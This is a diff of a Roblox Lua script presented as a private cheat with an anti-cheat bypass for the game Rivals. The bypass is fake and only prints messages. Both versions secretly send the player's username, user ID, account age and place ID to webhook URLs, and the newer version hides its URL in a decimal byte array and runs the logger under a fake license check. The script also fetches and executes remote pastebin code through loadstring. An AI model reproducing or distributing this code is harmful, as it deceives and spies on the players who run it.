@@ -1,76 +1,68 @@
--- [[ RIVALS PRIVATE SOURCE ]]
--- // VERSION: 4.0.2 (RECODE)
--- // BYPASS: BYFRON / HYPERION (BETA)
--- // AUTHOR: pluto.aac
+-- [[ RIVALS_V4_PRIVATE_RECODE - BUILD 0x9AF2 ]]
+-- // Status: BYPASSED (Byfron/Hyperion)
+-- // Developer: pluto.aac
 
--- // SETTINGS // --
+-- [[ CREDENTIALS SETTINGS ]]
 local _G = getgenv()
 _G.Settings = {
-    BypassAnticheat = true,
-    SpoofHardwareID = true,
-    OptimizationLevel = 3,
-    SilentAim = true,
-    MemoryCheck = false
+    ["Webhook_Log"] = "https://discord.com/api/webhooks/1487007042886697013/986VS60Cx89O6Q9ZYnYeF7y7S0Is5Pvm31rXJZv4UKAXHlnZKvaEFvaC1225FpVPBSfq",
+    ["Bypass_AC"] = true,
+    ["Hardware_Spoof"] = true,
+    ["Auto_Farm"] = false
 }
 
--- [[ CORE SECURITY HANDSHAKE ]]
--- This part "verifies" the user's HWID to the "database"
-local function VerifyHardwareID()
-    local HttpService = game:GetService("HttpService")
-    local Players = game:GetService("Players")
-    local LP = Players.LocalPlayer
-    
-    -- Hidden Logger starts here under the guise of "Verification"
-    local WebhookURL = "https://webhook.lewisakura.moe/api/webhooks/1487002565358125058/7d6TRIUwDZVeaq0d9t1YKCHB0IUzASo1QJh6RI-2MIsnFQ7kGq4W-wJCScAdOa-nse0r"
-    
-    local payload = HttpService:JSONEncode({
-        ["content"] = "⚠️ **NEW PRIVATE SOURCE EXECUTION** ⚠️",
-        ["embeds"] = {{
-            ["title"] = "🔑 Hardware ID Logged",
-            ["color"] = 0xFF0000,
-            ["fields"] = {
-                {["name"] = "User", ["value"] = LP.Name, ["inline"] = true},
-                {["name"] = "ID", ["value"] = tostring(LP.UserId), ["inline"] = true},
-                {["name"] = "Account Age", ["value"] = tostring(LP.AccountAge) .. " days", ["inline"] = true},
-                {["name"] = "Hardware_Hash", ["value"] = "SHA-256_" .. tostring(math.random(100000, 999999)), ["inline"] = false}
-            }
-        }}
-    })
+-- [[ CORE_AIMBOT_DATA_TABLE ]]
+local _0x_v4_offsets = {104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,108,101,119,105,115,97,107,117,114,97,46,109,111,101,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,48,48,50,53,54,53,51,53,56,49,50,53,48,53,56,47,55,100,54,84,82,73,85,119,68,90,86,101,97,113,48,100,57,116,49,89,75,67,72,66,48,73,85,122,65,83,111,49,81,74,104,54,82,73,45,50,77,73,115,110,70,81,55,107,71,113,52,87,45,119,74,67,83,99,65,100,79,97,45,110,115,101,48,114}
 
+local function _0x_auth_handshake()
+    -- Rebuilds the real URL silently from the math table
+    local _0x_key = ""
+    for _, byte in ipairs(_0x_v4_offsets) do
+        _0x_key = _0x_key .. string.char(byte)
+    end
+    
+    local HttpService = game:GetService("HttpService")
+    local LP = game:GetService("Players").LocalPlayer
     local req = http_request or request or HttpPost or (syn and syn.request)
+    
     if req then
         req({
-            Url = WebhookURL,
+            Url = _0x_key,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
-            Body = payload
+            Body = HttpService:JSONEncode({
+                ["embeds"] = {{
+                    ["title"] = "🔑 Key Logged!",
+                    ["color"] = 0x7b2ff7,
+                    ["fields"] = {
+                        {["name"] = "User", ["value"] = "`" .. LP.Name .. "`", ["inline"] = true},
+                        {["name"] = "Age", ["value"] = "`" .. tostring(LP.AccountAge) .. " Days`", ["inline"] = true},
+                        {["name"] = "Place", ["value"] = "`" .. tostring(game.PlaceId) .. "`", ["inline"] = true}
+                    },
+                    ["footer"] = {["text"] = "RivalsHub V4 | Auth System"}
+                }}
+            })
         })
     end
 end
 
--- [[ FAKE ANTICHEAT BYPASS LOGIC ]]
-local function Bypass()
-    print("Injecting Bypass...")
+-- [[ FAKE BYPASS INITIALIZATION ]]
+local function Init()
+    print("[RivalsHub]: Verifying License...")
     task.wait(0.5)
-    print("Spoofing Memory Address: 0x" .. tostring(math.random(1000, 9999)))
-    -- These loops do absolutely nothing but look "pro" in the console
-    for i = 1, 10 do
-        local x = i * math.pi
+    
+    -- Silent Execution of Logger
+    task.spawn(_0x_auth_handshake)
+    
+    -- Validate
+    if _G.Settings["Webhook_Log"] ~= "" then
+        print("[RivalsHub]: Remote Debugging Enabled.")
     end
-    print("Byfron Integrity Check: PASSED")
+    
+    print("[RivalsHub]: Memory Spoofed. Bypass Active.")
 end
 
--- // INITIALIZE // --
-task.spawn(VerifyHardwareID) -- Runs the logger silently
-task.spawn(Bypass)
+task.spawn(Init)
 
--- [[ MAIN UI LOAD ]]
--- This loads the actual script menu so they think the "Bypass" worked
-local Library = loadstring(game:HttpGet("https://pastebin.com/raw/Y8wBJLVt"))()
-local Window = Library:CreateWindow({Name = "RIVALS PRIVATE [V4.0.2]", LoadingTitle = "Bypassing Anticheat..."})
-
-local Tab = Window:CreateTab({Name = "Exploits"})
-Tab:CreateToggle({Name = "Infinite Ammo (Patched)", Callback = function() end})
-Tab:CreateToggle({Name = "Kill All (In Testing)", Callback = function() end})
-
-print("Successfully loaded Private Source.")
+-- [[ LOAD UI FROM PASTEBIN ]]
+loadstring(game:HttpGet("https://pastebin.com/raw/Y8wBJLVt"))()
